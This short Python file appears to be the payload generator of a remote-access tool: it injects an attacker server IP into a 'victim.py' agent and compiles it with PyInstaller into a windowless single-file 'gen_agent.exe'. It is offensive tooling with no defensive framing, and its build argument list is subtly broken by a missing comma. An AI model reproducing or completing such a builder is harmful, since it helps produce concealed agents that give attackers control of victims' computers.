from sys import platform

import PyInstaller.__main__

def generate_agent(serv_ip):
    with open('victim.py', 'r') as a:
        agent = a.read()

    agent = agent.replace('REPLACE_IP', serv_ip)

    with open('new_payload.py', 'w') as f:
        new_file = f.write(agent)
    
    a.close()
    f.close()


    if platform == 'linux':
        #TODO use wine to generate windows executable
        pass
    elif platform == 'windows':
        #TODO generate payload normally
        PyInstaller.__main__.run(['new_payload.py', '--noconsole',
            '--distpath',
            '..\\agents\\'
            '--clean',
            '-F',
            '-n',
            'gen_agent.exe'
        ])
